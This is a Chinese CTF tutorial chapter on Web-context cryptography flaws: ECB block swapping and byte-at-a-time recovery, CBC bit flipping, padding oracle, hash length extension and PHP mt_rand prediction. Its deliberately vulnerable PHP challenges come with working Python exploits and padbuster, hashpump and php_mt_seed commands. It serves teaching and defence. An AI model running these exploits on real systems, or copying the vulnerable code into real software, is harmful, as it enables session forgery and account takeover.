---
comments: true
---

# 密码学应用题

在 Web 方向的题目中，密码学通常不是作为理论考点出现，而是作为 **应用漏洞** 出现：开发者错误地使用分组模式、错误地设计校验逻辑、错误地使用随机数生成器。本节只讲 Web 语境下的密码学应用，关于古典密码、现代密码算法的理论推导，请参考本书 Crypto 部分的相关章节。

本节覆盖 CTF Web 题中最高频的几类考点：ECB 分组重排、CBC 比特翻转、Padding Oracle、哈希长度扩展攻击以及 PHP 随机数预测。目标只有一个：看完能动手做题。

## 前置知识：分组密码与填充

AES 是一种分组密码，一次只能加密固定长度（16 字节）的数据。为了加密任意长度的明文，需要两个机制：

- **工作模式**：ECB、CBC 等，决定多个分组之间如何关联。
- **填充（Padding）**：最常见的是 PKCS#7，把明文补齐到 16 的整数倍。规则很简单：缺 N 个字节就补 N 个值为 N 的字节。例如缺 3 字节就补 `\x03\x03\x03`；恰好整除则额外补一整块 16 个 `\x10`。解密后校验填充是否合法——这个"校验"就是 Padding Oracle 攻击的入口。

PHP 中常见的加密写法：

```php
<?php
$cipher = openssl_encrypt($data, 'AES-128-ECB', $key);          // ECB 模式
$cipher = openssl_encrypt($data, 'AES-128-CBC', $key, 0, $iv);  // CBC 模式，需要 IV
```

## ECB 分组重排

### 原理

ECB（Electronic Codebook）模式下，每个 16 字节的明文块独立加密，**相同的明文块永远得到相同的密文块**，块与块之间毫无关联。这带来两个致命问题：

1. **块可交换/可替换**：攻击者可以把密文按 16 字节切开，随意调换、复制、替换其中的块，解密后得到对应调换过的明文。
2. **逐字节探测**：如果攻击者能控制明文的一部分（比如用户名），而密文中又拼接了秘密信息（比如 flag），就可以一次一个字节地把秘密"撞"出来。

### 例题一：ECB 块交换提权

题目源码：

```php
<?php
$key = getenv('KEY');
$user = $_GET['user'] ?? 'guest';
$plain = "user=$user&role=guest";
$cipher = openssl_encrypt($plain, 'AES-128-ECB', $key);

if (isset($_GET['token'])) {
    $dec = openssl_decrypt(base64_decode($_GET['token']), 'AES-128-ECB', $key);
    if (strpos($dec, 'role=admin') !== false) {
        echo getenv('FLAG');
    } else {
        echo 'not admin';
    }
}
echo base64_encode($cipher);
```

明文按块排列如下（每块 16 字节）：

```text
user=guest&role= | guest\x0c\x0c\x0c...  (填充)
```

目标：构造出包含 `role=admin` 的密文。

**推导**：构造一个特殊的 `user`，让 `role=admin` 恰好单独占满一个块。`user=` 占 5 字节，补 11 个 `a` 填满第一块；`role=admin` 是 10 字节，后面再补 6 个 `a` 填满第二块。即 `user` 参数取

```text
"aaaaaaaaaaa" + "role=admin" + "aaaaaa"
```

明文分块为：

```text
块1: user=aaaaaaaaaaa
块2: role=adminaaaaaa
块3: &role=guest\x05\x05\x05\x05\x05   (PKCS#7 填充)
```

拿到密文后按 16 字节切开：`C1 | C2 | C3`。把 `C2`（解出 `role=adminaaaaaa` 的块）和 `C3`（解出 `&role=guest` 的块）交换或直接用 `C1 | C2` 拼接提交：

```text
token = base64encode(C1 || C2)
```

解密结果为 `user=aaaaaaaaaaarole=adminaaaaaa`，包含 `role=admin`，拿到 flag。Python 利用脚本：

```python
import base64, requests

url = 'http://target/'
payload_user = 'a' * 11 + 'role=admin' + 'a' * 6
r = requests.get(url, params={'user': payload_user})
ct = base64.b64decode(r.text.strip())

blocks = [ct[i:i+16] for i in range(0, len(ct), 16)]
token = base64.b64encode(blocks[0] + blocks[1]).decode()
r = requests.get(url, params={'token': token})
print(r.text)
```

### 例题二：ECB 逐字节探测（Byte-at-a-time）

题目特征：服务端把你提交的输入和 flag 拼接后加密返回：

```php
<?php
$key = getenv('KEY');
$flag = getenv('FLAG'); // 未知
$input = $_GET['data'] ?? '';
$plain = $input . $flag;          // 攻击者输入在前，秘密在后
echo base64_encode(openssl_encrypt($plain, 'AES-128-ECB', $key));
```

**原理推导**：假设 flag 未知，我们先提交 15 个 `a`：

```text
明文: aaaaaaaaaaaaaaa | F...............
      块1(15个a+flag第1字节)
```

块 1 的前 15 字节我们已知，第 16 字节是 flag 的第一个字符（记为 `c1`）。记下此时块 1 的密文 `T`。然后暴力枚举：提交 `aaaaaaaaaaaaaaa` + `X`（X 遍历所有可见字符），当某个 X 使块 1 密文等于 `T` 时，`X == c1`。

接着提交 14 个 `a`，则块 1 的第 15、16 字节是 `c1c2`，同样方法撞出 `c2`。依此类推，每轮猜一个字节，直到把 flag 全部猜完。每猜一个字节最多 256 次请求（实际只枚举可见字符，几十次即可）。

利用脚本：

```python
import base64, requests, string

url = 'http://target/'

def enc(data):
    r = requests.get(url, params={'data': data})
    return base64.b64decode(r.text.strip())

# 1. 先确定 flag 长度：不断增加填充，观察密文长度跳变
base_len = len(enc(''))
n = 1
while len(enc('a' * n)) == base_len:
    n += 1
flag_len = base_len - n  # 粗略估计，实际题目需结合块边界细算

flag = ''
charset = string.printable
for i in range(flag_len):
    pad = 'a' * (15 - i % 16)          # 让未知字节落在某块末尾
    block_idx = (len(pad) + i) // 16   # 目标块序号
    target = enc(pad)[block_idx*16:(block_idx+1)*16]
    for c in charset:
        trial = pad + flag + c
        if enc(trial)[block_idx*16:(block_idx+1)*16] == target:
            flag += c
            break
    print(flag)
```

**防御与识别**：做题时看到密文按块重复、或改输入导致密文只有部分块变化，基本就是 ECB。防御上应使用 CBC/GCM 等带 IV 的模式。

## CBC 比特翻转

### 原理

CBC（Cipher Block Chaining）模式中，每个明文块先与前一个密文块异或再加密：

```text
加密: C[i] = E(P[i] XOR C[i-1])，C[0] 用 IV 代替
解密: P[i] = D(C[i]) XOR C[i-1]
```

注意解密公式：`P[i]` 由 `D(C[i])`（固定值，我们只改密文不改密钥）和 `C[i-1]`（上一个密文块，攻击者可控）异或得到。因此：

> **修改 `C[i-1]` 的第 k 个字节，`P[i]` 的第 k 个字节就会跟着变，变化量就是我们异或进去的值。**

代价是：`C[i-1]` 被改动后，它自己解出的 `P[i-1]` 会变成乱码（因为 `D` 输入被破坏了）。所以通常改第一块明文要动 IV（IV 没有"前一块"，不会产生乱码），改后面的块则要忍受前一块变乱码，或想办法修复。

公式化：想把 `P[i]` 改成 `P'[i]`，只需：

```text
C'[i-1] = C[i-1] XOR P[i] XOR P'[i]
```

因为 `P'[i] = D(C[i]) XOR C'[i-1] = P[i] XOR C[i-1] XOR C'[i-1]`。

### 例题：登录态翻转

题目源码：

```php
<?php
$key = getenv('KEY');
$iv  = random_bytes(16);
$user = $_GET['user'] ?? 'guest';
$plain = "user=$user&role=guest";   // role 固定为 guest
$ct = openssl_encrypt($plain, 'AES-128-CBC', $key, OPENSSL_RAW_DATA, $iv);
$cookie = base64_encode($iv . $ct); // IV 拼在密文前面下发

if (isset($_GET['cookie'])) {
    $raw = base64_decode($_GET['cookie']);
    $iv  = substr($raw, 0, 16);
    $ct  = substr($raw, 16);
    $dec = openssl_decrypt($ct, 'AES-128-CBC', $key, OPENSSL_RAW_DATA, $iv);
    if ($dec && strpos($dec, 'role=admin') !== false) {
        echo getenv('FLAG');
    }
}
echo $cookie;
```

**推导**：注意这道题的校验是 `strpos` 找子串，而 `user` 参数本身就会拼进明文。令 `$user = "xxxxx&role=admin"`，明文为：

```text
块1: user=xxxxx&role=a
块2: dmin&role=guest\x01   (PKCS#7 填充)
```

`role=admin` 已经直接出现在明文里，根本不需要比特翻转——这说明本题的考点其实是 **注入分隔符**。为了演示真正的比特翻转，把校验改成全等比较的经典题：

```php
<?php
$key = getenv('KEY');
$iv  = random_bytes(16);
$plain = "role=guest;uid=1000;";
$ct = openssl_encrypt($plain, 'AES-128-CBC', $key, OPENSSL_RAW_DATA, $iv);
$cookie = base64_encode($iv . $ct);

if (isset($_GET['cookie'])) {
    $raw = base64_decode($_GET['cookie']);
    $dec = openssl_decrypt(substr($raw, 16), 'AES-128-CBC', $key,
                           OPENSSL_RAW_DATA, substr($raw, 0, 16));
    if ($dec === 'role=admin;uid=1000;') {
        echo getenv('FLAG');
    }
}
echo $cookie;
```

明文 `role=guest;uid=1000;` 长 20 字节，分两块：

```text
块1: role=guest;uid=1
块2: 000;\x0c\x0c...（填充12字节）
```

目标：把 `guest` 翻成 `admin`。`guest` 在块 1 的第 6~10 字节（偏移 5~9）。要改块 1 的明文，需异或 IV（IV 没有前一个密文块，不会产生乱码块）：

```python
import base64, requests

url = 'http://target/'
cookie = base64.b64decode(requests.get(url).text.strip())
iv, ct = cookie[:16], cookie[16:]

old = b'guest'
new = b'admin'
off = 5  # 'guest' 在第一块中的起始偏移
iv_new = bytearray(iv)
for i in range(5):
    iv_new[off + i] = iv[off + i] ^ old[i] ^ new[i]

payload = base64.b64encode(bytes(iv_new) + ct).decode()
print(requests.get(url, params={'cookie': payload}).text)
```

核心就是公式 `IV' = IV XOR "guest" XOR "admin"`（对应字节位置）。提交后解密出的第一块变成 `role=admin;uid=1`，第二块不变，整体与期望明文完全相等，拿到 flag。

## Padding Oracle

### 原理

承接 CBC 的解密公式 `P[i] = D(C[i]) XOR C[i-1]`。如果服务端在解密后会 **校验 PKCS#7 填充并给出不同的响应**（比如填充错误返回 500，填充正确但业务校验失败返回 200/403），这个"填充是否合法"的 1 bit 信息就构成一个 Oracle，可以把任意密文块逐字节解出来——**不需要知道密钥**。

以最后一个字节为例。设我们要解 `P[i]` 的最后一字节，记 `D(C[i])` 的最后一字节为 `d`（固定未知）。我们伪造 `C'[i-1]`，不断枚举其最后一字节 `x`，发送 `C'[i-1] || C[i]` 给服务器。当服务器返回"填充合法"时，说明解密结果最后一字节是 `\x01`（合法填充的一种），即：

```text
d XOR x = 0x01  =>  d = x XOR 0x01  =>  P[i]最后一字节 = d XOR C[i-1]最后一字节
```

接着构造让最后两字节为 `\x02\x02`：最后一字节用已解出的 `d` 反推固定，枚举倒数第二字节，直到服务器再次报填充合法。依此类推，16 字节全部解出，每字节最多 256 次请求。对每个密文块重复此过程，即可解开整个密文；反过来也能用它 **加密任意明文**（从后往前构造）。

### 利用思路（做题步骤）

1. 找到一个能提交密文、且服务端对不同解密结果有 **可区分响应** 的点（状态码、响应内容、响应时间的差异都算）。
2. 写脚本枚举：每次把目标块 `C[i]` 配上伪造的前一块 `R`（全零初始化），从最后一个字节开始，令 `R[15]` 遍历 0~255，记录使填充合法的值。
3. 注意 `\x01` 的歧义：如果明文末字节本身就是 `\x01`，伪造时可能误判，一般通过再改动倒数第二字节验证来排除。
4. 解出明文后若题目要求伪造明文（如 `role=admin`），反向构造密文即可。

成熟工具可直接用：`padbuster`（Perl 老牌工具）、Python 的 `paddingoracle` 库，或自己按上面逻辑写 30 行脚本。

### 例题思路

经典题目形态（如 Jarvis OJ 的 Shiro 反序列化前的 Padding Oracle、或各类"加密 cookie 登录"题）：cookie 是 `IV || AES-CBC(username)`，登录时解密，填充错误返回错误页面 A，填充正确但用户不存在返回页面 B。用 padbuster：

```bash
padbuster "http://target/login" "抓到的cookie值" 16 --cookies "auth=抓到的cookie值" -encoding 0
```

解出明文结构后，再用 padbuster 的加密模式伪造 `admin` 的 cookie：

```bash
padbuster "http://target/login" "cookie" 16 --cookies "auth=cookie" -encoding 0 -plaintext "user=admin"
```

拿到伪造 cookie 替换后即为 admin 身份。

## 哈希长度扩展攻击（Length Extension）

### 原理

MD5、SHA1、SHA256 等基于 Merkle–Damgård 结构的哈希，计算过程是"状态机"：把消息分块，逐块更新内部状态，最后的内部状态就是哈希值。这意味着：

> 知道 `H(secret || data)` 和 `secret` 的 **长度**（不需要知道内容），就可以把哈希值当作中间状态，继续追加数据，算出 `H(secret || data || padding || append)` 的合法哈希。

如果服务端用 `md5($secret . $data)` 做签名校验，攻击者就能在不知道 `$secret` 的情况下，伪造出追加了恶意内容（如 `&role=admin`）的合法签名。注意 `sha256($data . $secret)`（秘密在后）**不受** 此攻击影响；HMAC 也不受影响。

### 工具：hashpump

```bash
# 安装
git clone https://github.com/mheistermann/HashPump.git  # 或 apt install hashpump / pip 等

# 用法: hashpump -s 已知签名 -d 已知数据 -k 密钥长度 -a 追加数据
hashpump -s '571580b26c65f306376d4f64e53cb5c7' \
         -d 'user=guest' \
         -k 16 \
         -a '&role=admin'
```

输出两行：新的签名，以及包含填充的新数据（中间会有 `%80`、`%00` 之类的 URL 编码字节，直接作为参数提交即可）。密钥长度不知道就枚举（比如 8~32）逐个试。

### 例题

题目源码：

```php
<?php
$secret = getenv('SECRET'); // 未知，长度已知为 16（或需枚举）
$data = $_GET['data'] ?? '';
$sign = $_GET['sign'] ?? '';

if (empty($data)) {
    $d = 'user=guest';
    echo 'data=' . $d . '&sign=' . md5($secret . $d);
} else {
    if (md5($secret . $data) === $sign) {
        parse_str($data, $p);
        if (($p['role'] ?? '') === 'admin') {
            echo getenv('FLAG');
        }
    } else {
        echo 'bad sign';
    }
}
```

**解题过程**：

1. 直接访问拿到 `data=user=guest&sign=57158...`。
2. 用 hashpump 扩展：

```bash
hashpump -s '571580b26c65f306376d4f64e53cb5c7' -d 'user=guest' -k 16 -a '&role=admin'
# 输出:
# 新签名: 9f2c...
# 新数据: user=guest\x80\x00\x00...\xd0\x00\x00\x00\x00\x00\x00\x00&role=admin
```

3. 把新数据 URL 编码后连同新签名提交：

```http
GET /?data=user%3dguest%80%00%00%00%00%00%00%00%00%d0%00%00%00%00%00%00%00%26role%3dadmin&sign=9f2c...
```

服务端计算 `md5($secret . $data)`：由于 `$secret . $data` 正好等于 `secret || user=guest || glue padding || &role=admin`，其 MD5 与 hashpump 算出的新签名一致，校验通过；`parse_str` 解析出 `role=admin`，拿到 flag。

若密钥长度未知，写个循环枚举 `-k 8..32`，看哪个长度返回的不是 `bad sign`。

## 随机数问题：mt_rand 预测

### 原理

PHP 的 `mt_rand()` 基于梅森旋转算法（Mersenne Twister），**不是密码学安全的随机数**。问题有二：

1. **同种子同序列**：`mt_srand($seed)` 播种后，整个随机序列完全确定。如果种子可猜（如时间戳、`getmypid()`、0~2^31 的小范围值），攻击者可以爆破种子，复现全部"随机"输出——token、密码重置链接、加密密钥全部泄露。
2. **状态可恢复**：MT19937 的内部状态只有 624 个 32 位整数。只要能拿到 624 个连续的 32 位输出（或等价信息），就能还原整个状态，预测之后（甚至回溯之前）的所有输出。相关工具：`php_mt_seed`（已知少量输出爆破种子）、`mt19937` 状态恢复脚本。

`random_bytes()` / `random_int()` 是安全的，不受影响；`rand()`（libc 随机数）同样弱。

### 例题

```php
<?php
// 重置密码功能
mt_srand(time());   // 种子是当前时间戳！
$token = '';
for ($i = 0; $i < 16; $i++) {
    $token .= chr(mt_rand(0, 255));
}
// 把 token 作为 admin 的重置凭证写入 session/数据库
if (($_GET['token'] ?? '') === base64_encode($token)) {
    echo getenv('FLAG');
}
```

**解题过程**：种子是 `time()`，而响应头的 `Date` 字段（或服务端时间可通过其他途径得知）直接给出种子。本地复现：

```php
<?php
mt_srand(1699999999);  // 用响应头 Date 换算出的时间戳
$token = '';
for ($i = 0; $i < 16; $i++) {
    $token .= chr(mt_rand(0, 255));
}
echo base64_encode($token);
```

把时间戳前后各枚举几秒（请求发出到服务端执行可能有 1~2 秒偏差），逐个提交即可命中。另一种常见形态是种子为 `mt_rand()` 默认值或进程 PID，用 `php_mt_seed` 爆破：

```bash
# 已知一次 mt_rand(0, 1000000) 的输出为 834721，爆破种子
php_mt_seed 834721
```

得到种子后本地 `mt_srand($seed)` 重放整个序列，预测出题目后续的 token。

**做题 checklist**：看到 PHP 生成 token / 密钥 / 文件名时用了 `mt_rand`、`rand`、`uniqid`、`time()` 拼接 MD5，都应首先怀疑可预测。`uniqid()` 本质也是微秒时间戳，配合 `Date` 头可爆破。

## 小结

| 考点 | 根因 | 关键抓手 |
| :--- | :--- | :--- |
| ECB 重排/探测 | 块间独立、同明文同密文 | 16 字节切分，块交换或逐字节撞 |
| CBC 比特翻转 | `P[i] = D(C[i]) XOR C[i-1]`，前块可控 | `C'[i-1] = C[i-1] XOR P XOR P'` |
| Padding Oracle | 填充校验结果可区分 | 逐字节枚举，每字节 ≤256 次 |
| 长度扩展 | MD 结构哈希的状态延续 | hashpump，需知秘密长度 |
| mt_rand 预测 | 种子可猜 / 状态可恢复 | `Date` 头、php_mt_seed |

这类题往往还会和本书其他章节联动：解出的密文里可能是 PHP 反序列化串（见「PHP反序列化」），伪造的 cookie 可能用于越权（见「逻辑漏洞」），随机数问题常出现在找回密码流程中。审计时只要见到 `openssl_encrypt`、`md5($secret...)`、`mt_rand`，就该条件反射地检查本节列出的几个坑。
